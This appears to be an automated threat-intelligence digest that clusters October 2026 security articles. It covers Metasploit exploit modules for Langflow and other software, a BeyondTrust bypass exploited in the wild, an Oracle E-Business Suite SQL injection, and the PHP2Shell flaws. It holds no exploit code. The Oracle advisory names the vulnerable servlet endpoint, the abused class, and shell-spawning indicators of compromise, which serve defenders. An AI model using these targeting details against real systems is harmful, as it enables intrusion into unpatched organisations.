- Shared strong signals: CVE-2026-101767
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - cve_ids: CVE-2026-101767
  - urgency_signals: preauth_unauth, critical_cvss
- Cluster IDs: bda0ada973, 59969a7c2a
- Links:
  - https://horizon3.ai/attack-research/vulnerabilities/cve-2026-101767/
  - https://horizon3.ai/attack-research/vulnerabilities/cve-2026-76268/

## Forward signals

### Novelty
- Novel cves: 7
  - CVE-2026-10134 (first seen via Rapid7 at 2026-10-23T15:38:56+00:00, cluster 3d6ca9f782)
  - CVE-2026-7873 (first seen via Rapid7 at 2026-10-23T15:38:56+00:00, cluster 3d6ca9f782)
  - CVE-2026-93680 (first seen via Rapid7 at 2026-10-23T15:38:56+00:00, cluster 3d6ca9f782)
  - CVE-2026-15723 (first seen via The Hacker News at 2026-10-21T18:57:34+00:00, cluster 1906b7d782)
  - CVE-2026-89078 (first seen via The Hacker News at 2026-10-21T18:57:34+00:00, cluster 1906b7d782)
  - CVE-2026-93577 (first seen via The Hacker News at 2026-10-21T18:57:34+00:00, cluster 1906b7d782)
  - CVE-2026-110355 (first seen via Reddit r/netsec at 2026-10-23T14:37:35+00:00, cluster ce10cb1b5c)
- Novel actors: 0
- Novel products: 0

### Velocity bursts (2)
- **CVE-2026-109618 / CVE-2026-109619 | What is Known**
  - Cluster: 62cacaf073
  - Sources in window: 3
  - Window hours: 2.1
  - Cohort count: 7
- **CVE-2026-106173 Deep-Dive: FortiSIEM gRPC Path Traversal File Write RCE**
  - Cluster: 1b0472c213
  - Sources in window: 3
  - Window hours: 3.1
  - Cohort count: 4

### Leading edge (1)
- **CVE-2026-109618 / CVE-2026-109619 | What is Known**
  - Cluster: 62cacaf073
  - Lead hours: 14.1
  - First source: Reddit r/netsec
  - Later Tier 1 source: NCSC UK
  - Shared signals: AWS, CVE-2026-109618, CVE-2026-109619, Google Cloud, Google/Gemini, LiteSpeed

### Convergence (15)
- Pair: CVE-2026-0768 + Docker (cluster 3d6ca9f782, first observation: True)
- Pair: CVE-2026-0768 + GitHub (cluster 3d6ca9f782, first observation: True)
- Pair: CVE-2026-0768 + PyPI (cluster 3d6ca9f782, first observation: True)
- Pair: CVE-2026-0769 + Docker (cluster 3d6ca9f782, first observation: True)
- Pair: CVE-2026-0769 + GitHub (cluster 3d6ca9f782, first observation: True)
- Pair: CVE-2026-0769 + PyPI (cluster 3d6ca9f782, first observation: True)
- Pair: CVE-2026-10134 + Docker (cluster 3d6ca9f782, first observation: True)
- Pair: CVE-2026-10134 + GitHub (cluster 3d6ca9f782, first observation: True)
- Pair: CVE-2026-10134 + PyPI (cluster 3d6ca9f782, first observation: True)
- Pair: CVE-2026-7873 + Docker (cluster 3d6ca9f782, first observation: True)
- Pair: CVE-2026-7873 + GitHub (cluster 3d6ca9f782, first observation: True)
- Pair: CVE-2026-7873 + PyPI (cluster 3d6ca9f782, first observation: True)
- Pair: CVE-2026-93680 + Docker (cluster 3d6ca9f782, first observation: True)
- Pair: CVE-2026-93680 + GitHub (cluster 3d6ca9f782, first observation: True)
- Pair: CVE-2026-93680 + PyPI (cluster 3d6ca9f782, first observation: True)

### Drift (4)
- **APT28** (cluster 5aee3fe755)
  - New industries: healthcare
  - New products: Apple iOS/macOS
  - Prior top industries: education, government, manufacturing_industrial
  - Prior top products: Ivanti, VMware, WordPress
- **ShinyHunters** (cluster 5aee3fe755)
  - New industries: (none)
  - New products: Apple iOS/macOS
  - Prior top industries: financial_services, government, healthcare
  - Prior top products: Anthropic/Claude, OpenAI/ChatGPT, Salesforce
- **Lazarus** (cluster 27d2105c1c)
  - New industries: manufacturing_industrial
  - New products: (none)
  - Prior top industries: aviation_defense, financial_services, government
  - Prior top products: Android, Apple iOS/macOS, Microsoft Windows
- **TeamPCP** (cluster 1d63c3b8c3)
  - New industries: (none)
  - New products: AWS, Docker, PyPI, Salesforce
  - Prior top industries: critical_infrastructure, financial_services, government
  - Prior top products: GitHub, GitLab, npm

### Persistence (15)
- actor_attribution: ShinyHunters (weeks observed: 14, cluster 5aee3fe755)
- actor_attribution: Cl0p (weeks observed: 12, cluster fb556ca51b)
- actor_attribution: UNC5221 (weeks observed: 8, cluster f357c3f798)
- actor_attribution: TeamPCP (weeks observed: 8, cluster 1d63c3b8c3)
- actor_attribution: Lazarus (weeks observed: 7, cluster 27d2105c1c)
- actor_attribution: APT31 (weeks observed: 6, cluster 7c42269e48)
- actor_attribution: Salt Typhoon (weeks observed: 6, cluster b9771fe2d2)
- actor_attribution: Volt Typhoon (weeks observed: 6, cluster b9771fe2d2)
- actor_attribution: UNC6201 (weeks observed: 6, cluster b04cf6724c)
- cve_ids: CVE-2026-88771 (weeks observed: 5, cluster 790f27e740)
- actor_attribution: APT28 (weeks observed: 5, cluster 5aee3fe755)
- cve_ids: CVE-2025-53770 (weeks observed: 5, cluster 7c42269e48)
- actor_attribution: APT27 (weeks observed: 5, cluster 7c42269e48)
- cve_ids: CVE-2026-88779 (weeks observed: 4, cluster 790f27e740)
- cve_ids: CVE-2026-73570 (weeks observed: 4, cluster 9c6133d08b)

### Tier inversion (1)
- **Imperia CMS SiteActive TEMPLATE Unauthenticated SSTI Remote Code Execution (CVE-2026-110355)**
  - Cluster: ce10cb1b5c
  - Primary source: Reddit r/netsec
  - Strong signals: CVE-2026-110355

## Clusters

### Cluster 3d6ca9f782 — score 55

- Title: Metasploit Wrap Up: Langflow, MongoDB, and More
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-10-23T15:38:56+00:00
- Link: https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-langflow-mongodb-and-more
- Fetch status: ok
- Member count: 7
- Corroborating source count: 6
- Strong signals: CVE-2026-0768, CVE-2026-0769, CVE-2026-10134, CVE-2026-7873, CVE-2026-93680, GitHub

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng, supply_chain, web_shell_backdoor
- affected_products: Docker, GitHub, PyPI
- cve_ids: CVE-2026-0768, CVE-2026-0769, CVE-2026-10134, CVE-2026-7873, CVE-2026-93680
- urgency_signals: preauth_unauth
- content_type: incident_report, news_report
- confidence_tier: tier_1_offensive_research, tier_2_operator, tier_4_news

#### Primary article taxonomy
- affected_products: GitHub
- cve_ids: CVE-2026-93680, CVE-2026-0768, CVE-2026-0769, CVE-2026-10134, CVE-2026-7873
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
This release adds multiple new modules, and 6 of those modules point at a single target: Langflow , the open-source LLM workflow builder. Together they cover an authentication bypass (CVE-2026-93680), 3 unauthenticated remote code execution paths (CVE-2026-0768, CVE-2026-0769, and CVE-2026-10134), and 2 authenticated code execution flaws (CVE-2026-7873 and CVE-2026-93674), spanning Langflow releases from 1.0.0 through 1.11.4. Thanks to the work of rmhowe425 , with research credit to Peter Girnus and n0k0. Beyond Langflow, open source contributor kmkz contributed a pre-auth RCE chain against OpenCTI. MongoDB coverage has also been expanded with 3 new auxiliary modules plus an Apache Solr version scanner thanks to the work of community member h00die . New Module Content (11) 4gaBoards Mass User Information Disclosure (CVE-2026-53959) Authors: Balachandar Gowrisankar, de3erve (GitHub), and lucquach (GitHub) Type: Auxiliary Pull request: #21831 contributed by anirbala98 Path: gather/4gaboa
```

#### Full body

```
Metasploit Metasploit Wrap Up: Langflow, MongoDB, and More Alan David Foster Oct 23, 2026 | Last updated on Oct 23, 2026 | 5 min read Metasploit Wrap Up: Langflow, MongoDB, and More Table of contents Metasploit Wrap Up: Langflow, MongoDB, and More Table of contents This release adds multiple new modules, and 6 of those modules point at a single target: Langflow , the open-source LLM workflow builder. Together they cover an authentication bypass (CVE-2026-93680), 3 unauthenticated remote code execution paths (CVE-2026-0768, CVE-2026-0769, and CVE-2026-10134), and 2 authenticated code execution flaws (CVE-2026-7873 and CVE-2026-93674), spanning Langflow releases from 1.0.0 through 1.11.4. Thanks to the work of rmhowe425 , with research credit to Peter Girnus and n0k0. Beyond Langflow, open source contributor kmkz contributed a pre-auth RCE chain against OpenCTI. MongoDB coverage has also been expanded with 3 new auxiliary modules plus an Apache Solr version scanner thanks to the work of community member h00die . New Module Content (11) 4gaBoards Mass User Information Disclosure (CVE-2026-53959) Authors: Balachandar Gowrisankar, de3erve (GitHub), and lucquach (GitHub) Type: Auxiliary Pull request: #21831 contributed by anirbala98 Path: gather/4gaboards_users_info_disclosure_cve_2026_53959 CVE reference: CVE-2026-53959 Description: Adds a module that exploits CVE-2026-53959, a broken access control vulnerability allowing mass user information disclosure in 4gaBoards versions 3.3.8 and below. The application's /api/users REST endpoint lets any authenticated user retrieve a full, unpaginated list of every user in the system. Missing authorization checks allow an attacker to retrieve the email, phone, organization, name, and SSO email addresses (ssoGoogleEmail, ssoGithubEmail, and others) of every user. Langflow AI Authentication Bypass (CVE-2026-93680) Author: Richard Howe Type: Auxiliary Pull request: #21942 contributed by rmhowe425 Path: gather/langflow_auth_bypass_cve_2026_93680 CVE reference: CVE-2026-93680 Description: Adds a new auxiliary module that leverages CVE-2026-93680, an authentication bypass vulnerability impacting Langflow versions 1.5.0 through 1.11.4. Apache Solr Version Scanner Author: h00die Type: Auxiliary Pull request: #22006 contributed by h00die Path: scanner/http/apache_solr_version Description: Adds a new scanner that identifies Apache Solr and reports its version. MongoDB Auxiliary Module Suite Authors: h00die and prithvee07 Type: Auxiliary Pull request: #21785 contributed by h00die Description: Adds the mongodb_version, mongodb_schemadump, and mongodb_hashdump auxiliary modules, and updates the existing mongodb_login module. This PR adds the following modules: scanner/mongodb/mongodb_hashdump scanner/mongodb/mongodb_schemadump scanner/mongodb/mongodb_version OpenCTI Authentication Bypass and Notifier EJS Remote Code Execution Author: Jean-Marie Bourbon Type: Exploit Pull request: #21826 contributed by kmkz Path: linux/http/opencti_notifier_rce CVE references: CVE-2026-27960 and CVE-2026-39980 Description: Adds a new exploit module for OpenCTI that chains CVE-2026-27960 and CVE-2026-39980 to achieve unauthenticated remote command execution. Grafana SQL Expressions DuckDB Command Injection (CVE-2024-9264) Author: Özcan Ersan (@ozcanpng) Type: Exploit Pull request: #21901 contributed by ozcanpng Path: multi/http/grafana_sql_expressions_rce_cve_2024_9264 CVE reference: CVE-2024-9264 Description: Adds an authenticated exploit module for CVE-2024-9264, a DuckDB command injection in Grafana SQL Expressions. Langflow AI Code Validation Authenticated RCE (CVE-2026-7873) Authors: Richard Howe and n0k0 Type: Exploit Pull request: #21877 contributed by rmhowe425 Path: multi/http/langflow_auth_rce_cve_2026_7873 CVE reference: CVE-2026-7873 Description: Adds a new exploit module that detects and exploits CVE-2026-7873, an authenticated RCE vulnerability impacting Langflow versions 1.0.0 through 1.10.0. Langflow AI Auth
```

#### Corroborating sources (6)

- **Rapid7** (offensive_vulnerability_research)
  - Title: Metasploit Wrap Up: Langflow, MongoDB, and More
  - Published: 2026-10-23T15:38:56+00:00
  - Link: https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-langflow-mongodb-and-more
  - Summary: This release adds multiple new modules, and 6 of those modules point at a single target: Langflow , the open-source LLM workflow builder. Together they cover an authentication bypass (CVE-2026-93680), 3 unauthenticated remote code execution paths (CVE-2026-0768, CVE-2026-0769, and CVE-2026-10134), and 2 authenticated code execution flaws (CVE-2026-7873 and CVE-2026-93674), spanning Langflow releases from 1.0.0 through 1.11.4. Thanks to the work of rmhowe425 , with research credit to Peter Girnus and n0k0. Beyond Langflow, open source contributor kmkz contributed a pre-auth RCE chain against OpenCTI. MongoDB coverage has also been expanded with 3 new auxiliary modules plus an Apache Solr version scanner thanks to the work of community member h00die . New Module Content (11) 4gaBoards Mass User Information Disclosure (CVE-2026-53959) Authors: Balachandar Gowrisankar, de3erve (GitHub), and lucquach (GitHub) Type: Auxiliary Pull request: #21831 contributed by anirbala98 Path: gather/4gaboa
- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: LiteLLM Compromised in Fresh Supply Chain Attack
  - Published: 2026-10-23T08:10:46+00:00
  - Link: https://www.securityweek.com/litellm-compromised-in-fresh-supply-chain-attack/
  - Summary: Hackers used compromised GitHub CLI OAuth tokens to push and approve malicious packages on PyPI and Docker. The post LiteLLM Compromised in Fresh Supply Chain Attack appeared first on SecurityWeek .
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: LiteLLM Suspects GitHub Token Leak in AI Gateway Logs Behind Malicious Package Release
  - Published: 2026-10-22T08:28:48+00:00
  - Link: https://thehackernews.com/2026/10/litellm-suspects-github-token-leak-in.html
  - Summary: LiteLLM on Wednesday disclosed that threat actors compromised "multiple independent security controls" to push a malicious version of the Python package containing a credential stealer and a backdoor. On October 21, 2026, LiteLLM's release pipeline was compromised to push 1.107.0 to the Docker Hub registry and the Python Package Index (PyPI) repository. The incident took place around 4:00 a.m.
- **OpenSSF Blog** (ai_security_agentic_risk)
  - Title: Case Study: GitHub Expands Malware Advisories Across Eight Ecosystems with OpenSSF
  - Published: 2026-10-16T19:06:29+00:00
  - Link: https://openssf.org/blog/2026/10/16/case-study-github-expands-malware-advisories-across-eight-ecosystems-with-openssf/
  - Summary: Learn how GitHub integrated OpenSSF's malicious-package data into its Advisory Database to expand Dependabot malware alerts across eight ecosystems.
- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: Machine speed attacks require machine speed detection and response
  - Published: 2026-10-22T14:02:12+00:00
  - Link: https://www.bleepingcomputer.com/news/security/machine-speed-attacks-require-machine-speed-detection-and-response/
  - Summary: Attackers can steal credentials and begin exfiltrating data within minutes, often before security teams can respond. Exaforce examines real-world attacks involving stolen GitHub tokens, malicious AI installers, and MFA phishing, explaining why faster detection and automated containment are critical. [...]
- **Dark Reading** (cyber_news_breach_reporting)
  - Title: OVHcloud GitHub Compromise Tied to GlassWorm Threat Actors
  - Published: 2026-10-21T16:50:15+00:00
  - Link: https://www.darkreading.com/cyberattacks-data-breaches/ovhcloud-github-compromise-glassworm-threat-actors
  - Summary: A developer's GitHub account that was compromised several months earlier was used to push malicious code to unsuspecting users.

### Cluster f357c3f798 — score 50

- Title: CVE-2026-102764: Critical BeyondTrust Remote Support Authentication Bypass Exploited in the Wild
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-10-19T14:34:04+00:00
- Link: https://www.rapid7.com/blog/post/etr-cve-2026-102764-critical-beyondtrust-remote-support-authentication-bypass-exploited-in-the-wild
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-102764

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, apt_espionage, web_shell_backdoor
- actor_attribution: UNC5221
- cve_ids: CVE-2026-102764, CVE-2026-1731
- urgency_signals: actively_exploited, preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- threat_categories: apt_espionage, web_shell_backdoor, active_exploitation
- actor_attribution: UNC5221
- cve_ids: CVE-2026-102764, CVE-2026-1731
- urgency_signals: actively_exploited, preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Summary

```
Overview On October 15, 2026, BeyondTrust disclosed a critical authentication bypass in Remote Support (RS) , its platform for remotely troubleshooting and administering endpoints. Tracked as CVE-2026-102764 and assigned a CVSSv4 score of 9.3 , the vulnerability allows unauthenticated remote attackers to perform file operations on an affected appliance without user interaction. Versions 26.2.3 and earlier are affected unless the BT26-05-RS patch has been applied. BeyondTrust has confirmed that exploitation in the wild has already occurred prior to disclosure. Its October 16 report dates the two known Remote Support compromises to August 29, 2026: one BeyondTrust-hosted instance and one self-hosted appliance. BeyondTrust discovered and contained the hosted compromise on September 28; Mandiant shared corroborating findings from the self-hosted investigation on September 30. On October 16, 2026, CVE-2026-102764 was added to the U.S. Cybersecurity and Infrastructure Security Agency's (CISA
```

#### Full body

```
Rapid7 Intelligence CVE-2026-102764: Critical BeyondTrust Remote Support Authentication Bypass Exploited in the Wild Rapid7 Oct 19, 2026 | Last updated on Oct 19, 2026 | 4 min read CVE-2026-102764: Critical BeyondTrust Remote Support Authentication Bypass Exploited in the Wild Table of contents CVE-2026-102764: Critical BeyondTrust Remote Support Authentication Bypass Exploited in the Wild Table of contents Overview On October 15, 2026, BeyondTrust disclosed a critical authentication bypass in Remote Support (RS) , its platform for remotely troubleshooting and administering endpoints. Tracked as CVE-2026-102764 and assigned a CVSSv4 score of 9.3 , the vulnerability allows unauthenticated remote attackers to perform file operations on an affected appliance without user interaction. Versions 26.2.3 and earlier are affected unless the BT26-05-RS patch has been applied. BeyondTrust has confirmed that exploitation in the wild has already occurred prior to disclosure. Its October 16 report dates the two known Remote Support compromises to August 29, 2026: one BeyondTrust-hosted instance and one self-hosted appliance. BeyondTrust discovered and contained the hosted compromise on September 28; Mandiant shared corroborating findings from the self-hosted investigation on September 30. On October 16, 2026, CVE-2026-102764 was added to the U.S. Cybersecurity and Infrastructure Security Agency's (CISA) list of known exploited vulnerabilities (KEV), based on evidence of active exploitation. CISA's official KEV feed lists an October 19, 2026 due date and marks forensic triage as required. Rapid7 recommends remediating affected appliances on an emergency basis and investigating RS appliances for prior compromise. BeyondTrust's remote access products have previously been targeted earlier this year. Rapid7 covered CVE-2026-1731 , which was added to KEV in February 2026. Technical overview According to the vendor's CVE record, internal Remote Support components inadequately validate the origin of incoming messages, permitting file operations on the appliance. The flaw is classified as authentication bypass by spoofing ( CWE-290 ). BeyondTrust is withholding exploitation details while customers apply patches. Mandiant's investigation describes arbitrary file uploads, deployment of the SAWFLY PHP web shell and BARECLAW tunneler, root escalation, attempted credential-vault extraction, persistence, and log deletion. Mandiant attributes the activity to ARMORY CASTLE, a suspected PRC-nexus espionage actor formerly tracked as UNC5221. Mitigation guidance A vendor-provided patch is available. Rapid7 strongly recommends that organizations running affected self-hosted Remote Support appliances apply it on an emergency basis, outside of normal patching cycles. Per BeyondTrust's advisory : Affected versions: Remote Support 26.2.3 and earlier, unless the patch has been applied. Remediation: Apply the BT26-05-RS patch, available for versions 24.3.1 through to 26.2.3 . Older deployments: Instances older than 24.3.1 require an upgrade to a patch-supported version followed by application of the patch. Self-hosted deployments: Confirm installation through the /appliance interface. Apply the patch manually if automatic updates are not enabled. SaaS deployments: BeyondTrust states that all Remote Support SaaS customers were patched as of October 9, 2026. Note: BeyondTrust also recommends immediate patching of self-hosted Privileged Remote Access (PRA) because it shares the affected code. The vendor has not identified a way to exploit this vulnerability in PRA. PRA customers should confirm the appropriate patch with BeyondTrust Support. Rapid7 strongly recommends investigating for compromise even after patching. Mandiant recommends preserving evidence before changes or reboots, isolating suspected appliances, and rebuilding from a clean, fully patched image if compromise is confirmed or cannot be ruled out. Organizations should rotate stored or brokered credentials
```

#### Corroborating sources (1)

- **Rapid7** (offensive_vulnerability_research)
  - Title: CVE-2026-102764: Critical BeyondTrust Remote Support Authentication Bypass Exploited in the Wild
  - Published: 2026-10-19T14:34:04+00:00
  - Link: https://www.rapid7.com/blog/post/etr-cve-2026-102764-critical-beyondtrust-remote-support-authentication-bypass-exploited-in-the-wild
  - Summary: Overview On October 15, 2026, BeyondTrust disclosed a critical authentication bypass in Remote Support (RS) , its platform for remotely troubleshooting and administering endpoints. Tracked as CVE-2026-102764 and assigned a CVSSv4 score of 9.3 , the vulnerability allows unauthenticated remote attackers to perform file operations on an affected appliance without user interaction. Versions 26.2.3 and earlier are affected unless the BT26-05-RS patch has been applied. BeyondTrust has confirmed that exploitation in the wild has already occurred prior to disclosure. Its October 16 report dates the two known Remote Support compromises to August 29, 2026: one BeyondTrust-hosted instance and one self-hosted appliance. BeyondTrust discovered and contained the hosted compromise on September 28; Mandiant shared corroborating findings from the self-hosted investigation on September 30. On October 16, 2026, CVE-2026-102764 was added to the U.S. Cybersecurity and Infrastructure Security Agency's (CISA

### Cluster bda0ada973 — score 37

- Title: CVE-2026-101767 | Oracle E-Business Suite TCF SQL Injection and Remote Code Execution
- Source: Horizon3 Attack Research (offensive_vulnerability_research)
- Published: 2026-10-20T21:23:28+00:00
- Link: https://horizon3.ai/attack-research/vulnerabilities/cve-2026-101767/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-101767

#### Cluster taxonomy (union across members)
- threat_categories: zero_day
- affected_industries: financial_services, government
- cve_ids: CVE-2026-101767
- urgency_signals: critical_cvss, preauth_unauth, zero_day
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- threat_categories: zero_day
- affected_industries: financial_services, government
- cve_ids: CVE-2026-101767
- urgency_signals: zero_day, preauth_unauth, critical_cvss
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Summary

```
CVE-2026-101767 is a critical (CVSS 9.8) unauthenticated SQL injection vulnerability in Oracle E-Business Suite 12.2.3–12.2.15. Horizon3 researchers identified an attack chain enabling remote code execution through the TCF servlet. Learn about affected versions, October 2026 patches, mitigations, and NodeZero Rapid Response validation.
```

#### Full body

```
CVE-2026-101767 Oracle E-Business Suite TCF SQL Injection and Remote Code Execution CVE-2026-101767 is an unauthenticated SQL injection vulnerability in Oracle E-Business Suite (EBS) that can be chained to achieve remote code execution. Discovered by Horizon3.ai’s attack research team, the vulnerability allows an attacker with network access to the affected Thin Client Framework (TCF) servlet to execute SQL as the APPS database user, then run operating system commands as the EBS application account. The vulnerability has a CVSS 3.1 score of 9.8 (Critical) . Technical Details Oracle identifies the affected product as Oracle Application Object Library, Core component. Exploitation requires network access over HTTP or HTTPS, with no authentication or user interaction required. The vulnerability affects the TCF servlet at /OA_HTML/AppsTCFServer , implemented by oracle.apps.fnd.tcf.SocketServer . This endpoint is permitted through the default EBS URL firewall configuration. An attacker can send a crafted request to the vulnerable servlet to execute SQL with the privileges of the APPS database user. The attack chain also enables operating system command execution with the privileges of the EBS application account. Successful exploitation allows an attacker to read or modify application data accessible to APPS and execute commands on the application host. Depending on the deployment, affected data may include financial, payroll, HR, and procurement records. Operating system access is governed by the permissions of the compromised EBS application account. Internet-facing EBS web tiers present the most direct exposure. Internal deployments are also at risk if an attacker can reach the vulnerable servlet from a compromised system or another accessible network segment. CVSS 3.1: 9.8 (Critical) Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H Stop Guessing, Start Proving Schedule a demo NodeZero® Proactive Security Platform Rapid Response A NodeZero Rapid Response test has been developed to safely validate whether this vulnerability can be exploited in your environment. The test uses real attack techniques to give teams immediate clarity on exploitable exposure. Run the Rapid Response test: Launch the test from NodeZero to determine whether exploitation is possible. Patch immediately: Apply the applicable Oracle October 2026 Critical Patch Update patches. Re-run the test: Verify that the vulnerability is no longer exploitable after remediation. Affected Versions & Patch Affected Oracle Application Object Library in Oracle E-Business Suite versions 12.2.3 through 12.2.15 , inclusive. Fixed Oracle addressed CVE-2026-101767 in its October 2026 Critical Patch Update , released on October 20, 2026 . Apply the patches applicable to your installation using the Oracle E-Business Suite patch availability documentation referenced in the advisory, My Oracle Support Note KA923 . Mitigations Until the applicable patches are installed: Remove /OA_HTML/AppsTCFServer , associated with oracle.apps.fnd.tcf.SocketServer , from the EBS URL firewall allowlist. Restrict access to the EBS web tier to trusted networks. Monitor the EBS application host and database for signs of compromise. Apply access restrictions across all untrusted network paths to the servlet. These measures reduce exposure but do not replace patching. Indicators of Compromise: Unauthenticated POST requests to /OA_HTML/AppsTCFServer that instantiate the Gantt data-server class ( oracle.apps.jtf.gantt.server.GanttDataServer ), followed by backend database activity. SQL reconnaissance shortly after unauthenticated web requests (database version, current user, directory objects). Unexpected files in $APPLPTMP and the oracle account spawning /bin/sh via the Concurrent Manager to run OS commands. Timeline July 24, 2026 Horizon3 Discloses Zero Day to Oracle. Horizon3 Rapid Response customer assets are assessed and notified. October 20, 2026: Oracle published its October 2026 Critical Patch Upd
```

#### Corroborating sources (1)

- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: CVE-2026-101767 | Oracle E-Business Suite TCF SQL Injection and Remote Code Execution
  - Published: 2026-10-20T21:23:28+00:00
  - Link: https://horizon3.ai/attack-research/vulnerabilities/cve-2026-101767/
  - Summary: CVE-2026-101767 is a critical (CVSS 9.8) unauthenticated SQL injection vulnerability in Oracle E-Business Suite 12.2.3–12.2.15. Horizon3 researchers identified an attack chain enabling remote code execution through the TCF servlet. Learn about affected versions, October 2026 patches, mitigations, and NodeZero Rapid Response validation.

### Cluster 62cacaf073 — score 36

- Title: CVE-2026-109618 / CVE-2026-109619 | What is Known
- Source: Horizon3 Attack Research (offensive_vulnerability_research)
- Published: 2026-10-21T14:50:44+00:00
- Link: https://horizon3.ai/attack-research/vulnerabilities/cve-2026-109618-cve-2026-109619/
- Fetch status: ok
- Member count: 19
- Corroborating source count: 17
- Strong signals: CVE-2026-109618, CVE-2026-109619

#### Cluster taxonomy (union across members)
- affected_products: AWS, Google Cloud, Google/Gemini, LiteSpeed
- cve_ids: CVE-2026-109618, CVE-2026-109619
- urgency_signals: critical_cvss, poc_available, preauth_unauth
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_1_government, tier_1_offensive_research, tier_1_primary_research, tier_2_operator, tier_4_news, tier_5_chatter

#### Primary article taxonomy
- affected_products: LiteSpeed
- cve_ids: CVE-2026-109618, CVE-2026-109619
- urgency_signals: preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Summary

```
PHP2Shell refers to two critical PHP core vulnerabilities, CVE-2026-109618 and CVE-2026-109619, that can enable unauthenticated remote code execution. Explore the out-of-memory corruption and stale global state attack paths, affected PHP versions, exploitation conditions, and October 2026 security updates.
```

#### Full body

```
PHP Core Remote Code Execution Vulnerabilities (PHP2Shell) CVE-2026-109618 / CVE-2026-109619 Latest Updates October 22, 2026 | 02:01 pm ET The team is all hands on deck working on a reliable test for PHP2Shell. These vulnerabilities don’t have one simple, repeatable trigger: exploiting them depends on the exact state of PHP’s memory and the request at a precise moment. Because the flaws sit in the PHP core itself, before your application code even runs, they’re very hard to detect through normal application logging and tracing. We are seeing a lot of PoCs, scanners, and checks floating around. From what we’ve observed, these checks are geared toward specific lab situations, rely on version checks or configurations uncommon in production environments, don’t account for WAFs or other mitigating factors, or involve some combination of the above. While we’re working to get something into your hands as soon as possible, we will never compromise our commitment to Production Safety. We also want to deliver an accurate signal, rather than add more noise to what’s already out there. In the meantime, we’ve proactively identified assets potentially exposed to these vulnerabilities through fingerprinting within known customer environments. Those customers have been notified within the platform. What is Known CVE-2026-109618 and CVE-2026-109619, publicly referred to as PHP2Shell, are critical PHP vulnerabilities that can allow unauthenticated remote code execution. PHP released security updates on October 21, 2026. PHP identifies all installations serving web requests as at risk, including PHP-FPM, Apache with mod_php, php-cgi, FrankenPHP, and LiteSpeed. The project considers the risk highest for mod_php. Exploitation conditions vary by vulnerability and deployment. CISA urges immediate patching, prioritizing internet-facing systems. Organizations should also identify internal applications, containers, hosted services, and vendor products that depend on PHP. CVSS v3.1: Red Hat’s records list 9.8 (Critical) from NVD and 8.1 (High) from Red Hat for both vulnerabilities. The assessments differ on attack complexity. CVSS measures severity, not how many organizations or systems may be affected. Stop Guessing, Start Proving Schedule a demo Technical Details CVE-2026-109618: Remote Code Execution via Out-of-Memory Corruption Out-of-memory handling can interrupt PHP while internal request memory is only partially initialized. Request cleanup may subsequently process that invalid state. PHP validated unauthenticated remote code execution against mod_php before application code runs. PHP-FPM prevents that particular startup-failure sequence but is considered susceptible through other conditions. The advisory reports no complete demonstrated FPM exploit for this CVE. CVE-2026-109619: Remote Code Execution via Stale Global State PHP workers can retain references to request-owned memory after it has been freed. A later request handled by the same worker can access that stale state. PHP validated session lifecycle remote code execution against mod_php and PHP-FPM. The validated FPM path requires a suitable application operation, a fatal error, and another request reaching the same worker. Successful exploitation runs code with the web worker’s privileges. Exploitation Status Amazon Threat Intelligence reports a PHP2Shell exploitation attempt in its MadPot telemetry dating to October 17, 2026, followed by additional attempts before and after public disclosure. Its analysis states that it was unclear whether the pre-disclosure attempts would have succeeded against real-world systems. CISA’s October 21 statement that it had not observed exploitation reflects its observations at that time. It should not be interpreted as evidence that exploitation attempts have not occurred. NodeZero® Proactive Security Platform Rapid Response Update as of October 22, 2026: Horizon3 is evaluating a Rapid Response check for PHP2Shell. We will share availability and guidance
```

#### Corroborating sources (17)

- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: CVE-2026-109618 / CVE-2026-109619 | What is Known
  - Published: 2026-10-21T14:50:44+00:00
  - Link: https://horizon3.ai/attack-research/vulnerabilities/cve-2026-109618-cve-2026-109619/
  - Summary: PHP2Shell refers to two critical PHP core vulnerabilities, CVE-2026-109618 and CVE-2026-109619, that can enable unauthenticated remote code execution. Explore the out-of-memory corruption and stale global state attack paths, affected PHP versions, exploitation conditions, and October 2026 security updates.
- **Rapid7** (offensive_vulnerability_research)
  - Title: CVE-2026-109618 and CVE-2026-109619: Critical Unauthenticated Remote Code Execution in PHP
  - Published: 2026-10-21T15:22:52+00:00
  - Link: https://www.rapid7.com/blog/post/etr-cve-2026-109618-and-cve-2026-109619-critical-unauthenticated-remote-code-execution-in-php
  - Summary: Overview On October 21, 2026, the PHP project announced security releases for two critical vulnerabilities in PHP. CVE-2026-109618 can corrupt memory during out-of-memory (OOM) handling, while CVE-2026-109619 is a use-after-free flaw involving state retained between requests. Both have a CVSSv4 score of 9.2 and both can allow for unauthenticated remote code execution (RCE) with the web worker's privileges. CVE CVSSv4 Description CVE-2026-109618 9.2 (Critical) RCE via OOM corruption CVE-2026-109619 9.2 (Critical) RCE via stale global state All installations serving web requests are at risk, including PHP-FPM, Apache mod_php, php-cgi, FrankenPHP, and LiteSpeed. The vendor considers mod_php the highest risk because exploitation can succeed before any application code runs. The advisories report that a successful RCE exploit was developed during research, including achieving RCE against Apache mod_php and PHP-FPM through different attack paths. As of October 21, 2026, there are multiple in
